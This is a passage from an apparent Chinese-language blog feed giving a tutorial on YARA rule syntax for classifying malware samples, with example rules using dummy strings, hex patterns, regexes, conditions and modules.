Hex</h3><p>这里其实有三种，文本，十六进制，还有一种是正则。</p><p>十六进制可以使用占位符<code>?</code>，通配符使用<code>[]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hex_string = &#123; E2 <span class="number">34</span> ?? C8 A? FB &#125;</span><br><span class="line">$hex_string = &#123; F4 <span class="number">23</span> [<span class="number">4</span><span class="number">-6</span>] <span class="number">62</span> B4 &#125;</span><br></pre></td></tr></table></figure><p>yara2.0之后可以使用无界跳转：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FE <span class="number">39</span> <span class="number">45</span> [<span class="number">10</span>-] <span class="number">89</span> <span class="number">00</span></span><br><span class="line">FE <span class="number">39</span> <span class="number">45</span> [-] <span class="number">89</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>还有一种给定部分的替换方案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hex_string = &#123; F4 <span class="number">23</span> ( <span class="number">62</span> B4 | <span class="number">56</span> ) <span class="number">45</span> &#125;</span><br></pre></td></tr></table></figure><p>他会匹配：<code>F42362B445 or F4235645</code></p><h3 id="text-strings">3.2.2 Text strings</h3><h4 id="不区分大小写nocase">不区分大小写：nocase</h4><p>不区分大小写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$text_string = <span class="string">&quot;foobar&quot;</span> nocase</span><br></pre></td></tr></table></figure><h4 id="宽字节wide">宽字节：wide</h4><p>如果字符串“Borland”的编码为每个字符两个字节（即B00o00r00l00a00n00d），则以下规则将匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule WideCharTextExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $wide_string = <span class="string">&quot;Borland&quot;</span> wide</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $wide_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要同时搜索ASCII和wide格式的字符串，可以将ASCII修饰符与wide结合使用，先后顺序无所谓：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wide_and_ascii_string = <span class="string">&quot;Borland&quot;</span> wide ascii</span><br></pre></td></tr></table></figure><blockquote><p>默认情况下Text就是ascii的。</p></blockquote><h4 id="xorxor">XOR：xor</h4><p>以下规则将搜索应用于字符串“This program cannot”（包括明文字符串）的每个单字节XOR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $xor_string = <span class="string">&quot;This program cannot&quot;</span> <span class="keyword">xor</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $xor_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $xor_string_00 = <span class="string">&quot;This program cannot&quot;</span></span><br><span class="line">        $xor_string_01 = <span class="string">&quot;Uihr!qsnfs`l!b`oonu&quot;</span></span><br><span class="line">        $xor_string_02 = <span class="string">&quot;Vjkq\&quot;rpmepco\&quot;acllmv&quot;</span></span><br><span class="line">        <span class="comment">// Repeat for every single byte XOR</span></span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以结合<code>wide</code>和<code>ascii</code>使用</p><h4 id="base64base64">base64：base64</h4><p>以下规则将搜索字符串“此程序无法”的三个base64排列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rule Base64Example1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;This program cannot&quot;</span> base64</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VGhpcyBwcm9ncmFtIGNhbm5vd</span></span><br><span class="line"><span class="comment">RoaXMgcHJvZ3JhbSBjYW5ub3</span></span><br><span class="line"><span class="comment">UaGlzIHByb2dyYW0gY2Fubm90</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>base64wide修改器的工作方式与base64修改器类似，但base64调整器的结果将转换为wide。</p><p>base64和base64宽修饰符还支持自定义字母表，当然字母表长度必须为64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;This program cannot&quot;</span> base64(<span class="string">&quot;!@#$%^&amp;*()&#123;&#125;[].,|ABCDEFGHIJ\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="searching-for-full-wordsfullword">Searching for full words：fullword</h4><p>比如说匹配domain的话，<code>www.mydomain.com</code>这样不会被匹配，但：<code>www.my-domain.com and www.domain.com</code>这样会被匹配</p><h3 id="正则">3.2.3 正则</h3><p>正则同样可以后面跟nocase，ascii等修饰符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule RegExpExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /md5: [<span class="number">0</span><span class="number">-9</span>a-fA-F]&#123;<span class="number">32</span>&#125;/</span><br><span class="line">        $re2 = /state: (on|off)/</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $re1 <span class="keyword">and</span> $re2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在后面结束的斜杠后面加i或者s，用于指定正则表达式不区分大小写。</p><p><code>.</code>可以匹配新一行的字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule RegExpExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /foo/i    <span class="comment">// This regexp is case-insentitive</span></span><br><span class="line">        $re2 = /bar./s   <span class="comment">// In this regexp the dot matches everything, including new-line</span></span><br><span class="line">        $re3 = /baz./is  <span class="comment">// Both modifiers can be used together</span></span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>YARA正则表达式识别以下元字符：</p><table><thead><tr class="header"><th style="text-align: center;"><code>\</code></th><th style="text-align: center;">引用下一个元字符</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong><code>^</code></strong></td><td style="text-align: center;"><strong>匹配文件的开头，或在用作左括号后的第一个字符时，对字符类求反</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>$</code></strong></td><td style="text-align: center;"><strong>匹配文件的结尾</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>.</code></strong></td><td style="text-align: center;"><strong>匹配除换行符以外的任何单个字符</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>|</code></strong></td><td style="text-align: center;"><strong>Alternation</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>()</code></strong></td><td style="text-align: center;"><strong>Grouping</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>[]</code></strong></td><td style="text-align: center;"><strong>Bracketed character class</strong></td></tr></tbody></table><p>以下量词也可以识别：</p><table><thead><tr class="header"><th style="text-align: center;"><strong><code>*</code></strong></th><th style="text-align: center;"><strong>Match 0 or more times</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong><code>+</code></strong></td><td style="text-align: center;"><strong>Match 1 or more times</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>?</code></strong></td><td style="text-align: center;"><strong>Match 0 or 1 times</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>&#123;n&#125;</code></strong></td><td style="text-align: center;"><strong>Match exactly n times（精确匹配）</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>&#123;n,&#125;</code></strong></td><td style="text-align: center;"><strong>Match at least n times（至少匹配n次）</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>&#123;,m&#125;</code></strong></td><td style="text-align: center;"><strong>Match at most m times（最多匹配n次）</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>&#123;n,m&#125;</code></strong></td><td style="text-align: center;"><strong>Match n to m times</strong></td></tr></tbody></table><p>以下转义字符可识别：</p><table><thead><tr class="header"><th style="text-align: center;"><strong><code>\t</code></strong></th><th style="text-align: center;"><strong>Tab (HT, TAB)</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong><code>\n</code></strong></td><td style="text-align: center;"><strong>New line (LF, NL)</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>\r</code></strong></td><td style="text-align: center;"><strong>Return (CR)</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>\f</code></strong></td><td style="text-align: center;"><strong>Form feed (FF)换页</strong></td></tr><tr class="even"><td style="text-align: center;"><strong><code>\a</code></strong></td><td style="text-align: center;"><strong>Alarm bell</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong><code>\xNN</code></strong></td><td style="text-align: center;"><strong>序号为给定十六进制数的字符</strong></td></tr></tbody></table><p>公认字符类：</p><table><thead><tr class="header"><th><code>\w</code></th><th>匹配单词字符 (alphanumeric plus “_”)</th></tr></thead><tbody><tr class="odd"><td><code>\W</code></td><td>匹配非单词字符</td></tr><tr class="even"><td><code>\s</code></td><td>匹配空白字符</td></tr><tr class="odd"><td><code>\S</code></td><td>Match a non-whitespace character</td></tr><tr class="even"><td><code>\d</code></td><td>匹配十进制数字字符</td></tr><tr class="odd"><td><code>\D</code></td><td>Match a non-digit character</td></tr></tbody></table><h2 id="conditions">3.3 Conditions</h2><p>conditions就是布尔表达式，and or not ，关系运算符，算数运算符，位运算等。</p><p>整数的长度始终为64位，使用位运算符时（例如，~0x01不是0xFE，而是0xFFFFFFFFFE）。</p><h3 id="counting-strings">3.3.1 Counting strings</h3><p>如题，就是计算string的次数，这里使用的是井号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="meta">#a == 6 and #b &gt; 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>yara4.2.0后，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#a in (filesize-500..filesize) == 2</span></span><br><span class="line"><span class="comment">//文件最后500个字节中的“a”字符串数必须正好等于2。</span></span><br></pre></td></tr></table></figure><h3 id="string-offsets-or-virtual-addresses">3.3.2 String offsets or virtual addresses</h3><p>需要知道字符串是否位于文件上的某个特定偏移量或进程地址空间中的某个虚拟地址，使用at。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a at <span class="number">100</span> <span class="keyword">and</span> $b at <span class="number">200</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>at的优先级高于and</p><p>at运算符允许在文件或进程内存空间中的虚拟地址的某个固定偏移量处搜索字符串，而in运算符允许在偏移量或地址范围内搜索字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (<span class="number">0.</span><span class="number">.100</span>) <span class="keyword">and</span> $b in (<span class="number">100.</span>.filesize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以使用@a[i]获得字符串$a第i次出现的偏移量或虚拟地址。索引是基于1的，因此第一次出现是@a[1]，第二次出现是@a[2]，依此类推。如果提供的索引大于字符串的出现次数，则结果将是一个NaN（不是数字）值。</p></blockquote><h3 id="file-size">3.3.3 File size</h3><p>直接就是<code>filesize</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rule FileSizeExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &gt; <span class="number">200</span>KB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="executable-entry-point">3.3.4 Executable entry point</h3><p>另个一特殊的变量就是<code>entrypoint</code>，当然，使用这个的前提必须是pe文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rule EntryPointExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a at entrypoint</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule EntryPointExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; <span class="number">9</span>C <span class="number">50</span> <span class="number">66</span> A1 ?? ?? ?? <span class="number">00</span> <span class="number">66</span> A9 ?? ?? <span class="number">58</span> <span class="number">0F</span> <span class="number">85</span> &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (entrypoint..entrypoint + <span class="number">10</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="给定位置的数据访问">3.3.5 给定位置的数据访问</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int8(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int16(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int32(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">uint8(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint16(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint32(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">int8be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int16be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int32be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">uint8be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint16be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint32be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule IsPE</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">// MZ signature at offset 0 and ...</span></span><br><span class="line">        uint16(<span class="number">0</span>) == <span class="number">0x5A4D</span> <span class="keyword">and</span></span><br><span class="line">        <span class="comment">// ... PE signature at offset stored in MZ header at 0x3C</span></span><br><span class="line">        uint32(uint32(<span class="number">0x3C</span>)) == <span class="number">0x00004550</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串集">3.3.6 字符串集</h3><p>使用<code>of</code>，至少存在字符串集中的一部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">        $c = <span class="string">&quot;dummy3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">2</span> of ($a,$b,$c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $foo1 = <span class="string">&quot;foo1&quot;</span></span><br><span class="line">        $foo2 = <span class="string">&quot;foo2&quot;</span></span><br><span class="line">        $foo3 = <span class="string">&quot;foo3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">2</span> of ($foo*)  <span class="comment">// equivalent to 2 of ($foo1,$foo2,$foo3)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule OfExample3</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $foo1 = <span class="string">&quot;foo1&quot;</span></span><br><span class="line">        $foo2 = <span class="string">&quot;foo2&quot;</span></span><br><span class="line"></span><br><span class="line">        $bar1 = <span class="string">&quot;bar1&quot;</span></span><br><span class="line">        $bar2 = <span class="string">&quot;bar2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">3</span> of ($foo*,$bar1,$bar2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以直接使用<code>($*)</code>引用所有字符串，或者可以使用<code>them</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample4</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">        $c = <span class="string">&quot;dummy3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">1</span> of them <span class="comment">// equivalent to 1 of ($*)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有以下几种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">all of them       <span class="comment">// all strings in the rule</span></span><br><span class="line">any of them       <span class="comment">// any string in the rule</span></span><br><span class="line"><span class="function">all <span class="title">of</span> <span class="params">($a*)</span>      <span class="comment">// all strings whose identifier starts by $a</span></span></span><br><span class="line"><span class="function">any <span class="title">of</span> <span class="params">($a,$b,$c)</span> <span class="comment">// any of $a, $b or $c</span></span></span><br><span class="line"><span class="function">1 <span class="title">of</span> <span class="params">($*)</span>         <span class="comment">// same that &quot;any of them&quot;</span></span></span><br><span class="line"><span class="function">none <span class="title">of</span> <span class="params">($b*)</span>     <span class="comment">// zero of the set of strings that start with &quot;$b&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="对多个字符串应用相同的条件">3.3.7 对多个字符串应用相同的条件</h3><p>使用的是<code>for...of</code>操作符：</p><p><code>for expression of string_set : ( boolean_expression )</code></p><blockquote><p>从string_ set中的这些字符串中，至少它们的expression必须满足boolean_expression</p></blockquote><p>可以使用<code>$</code>来做占位符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> any <span class="title">of</span> <span class="params">($a,$b,$c)</span> : <span class="params">( $ at pe.entry_point  )</span></span></span><br></pre></td></tr></table></figure><h3 id="使用带of和for..of的匿名字符串">3.3.8 使用带of和for..of的匿名字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule AnonymousStrings</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $ = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $ = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">1</span> of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="迭代字符串出现次数">3.3.9 迭代字符串出现次数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rule Occurrences</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="keyword">for</span> all i in (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) : ( @a[i] + <span class="number">10</span> == @b[i] )</span><br><span class="line">    <span class="comment">//也可以这样写</span></span><br><span class="line">    <span class="comment">//for all i in (1..3) : ( @a[i] + 10 == @b[i] )</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#a表示$a的出现次数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> all i <span class="title">in</span> <span class="params">(<span class="number">1.</span>.#a)</span> : <span class="params">( @a[i] &lt; <span class="number">100</span> )</span></span></span><br><span class="line"><span class="function"><span class="comment">//每次出现都在前100字节内</span></span></span><br></pre></td></tr></table></figure><h3 id="iterators">3.3.10 Iterators</h3><p>yara4.0后<code>for...of</code> 得到了改善</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> any section in pe.sections : ( section.name == <span class="string">&quot;.text&quot;</span> )</span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> any i <span class="title">in</span> <span class="params">(<span class="number">0.</span>.pe.number_of_sections<span class="number">-1</span>)</span> : <span class="params">( pe.sections[i].name == <span class="string">&quot;.text&quot;</span> )</span></span></span><br></pre></td></tr></table></figure><h2 id="more-rules">3.4 More rules</h2><h3 id="global-rules">3.4.1 Global rules</h3><p>全局规则允许您同时在所有规则中施加限制。全局规则可以有很多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">global rule SizeLimit</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &lt; <span class="number">2</span>MB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rule-tags">3.4.2 Rule tags</h3><p>这些tag稍后可以用于过滤YARA的输出</p><h3 id="metadata">3.4.3 Metadata</h3><p>没啥说的，上面写了。</p><h1 id="modules">4.Modules</h1><h2 id="pe">4.1 PE</h2><blockquote><p>https://yara.readthedocs.io/en/v4.2.3/modules/pe.html</p></blockquote><p>有点多，，没啥写的</p><p>后面那个elf也是</p><h2 id="magic">4.2 Magic</h2><p>就是文件的 magic，可以file命令查看</p><p>Magic Module一共两个函数：</p><ul><li><p>type()：returning a string with the type of the file.</p><p><code>magic.type() contains "PDF"</code></p></li><li><p>mime_type()：returning a string with the MIME type of the file.</p><p><code>magic.mime_type() == "application/pdf"</code></p></li></ul><h2 id="hash">4.3 Hash</h2><p>不用解释了，，有：MD5，sha1，sha256</p><h2 id="math">4.4 Math</h2><blockquote><p>允许您从文件的某些部分计算某些值，并基于这些结果创建签名。</p></blockquote><h2 id="console-module">4.5 Console module</h2><ul><li>log(string)：<code>console.log(pe.imphash())</code></li><li>log(message,string)：<code>console.log("The imphash is: ", pe.imphash())</code></li></ul><p>后面的参数不止可以string，int，float也可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;yara简介&quot;&gt;1.YARA简介&lt;/h1&gt;
&lt;p&gt;YARA 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意软件样本的开源工具。&lt;/p&gt;
&lt;p&gt;YARA的每一条描述、规则都由一系列字符串和一个布尔型表达式构成，并阐述其逻辑。</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Antivirus" scheme="https://ghostasky.github.io/tags/Antivirus/"/>
    
  </entry>
  
  <entry>
    <title>RC4</title>
    <link href="https://ghostasky.github.io/2022/07/27/RC4/"/>
    <id>https://ghostasky.github.io/2022/07/27/RC4/</id>
    <published>2022-07-26T16:00:00.000Z</published>
    <updated>2022-07-27T15:01:50.124Z</updated>
    
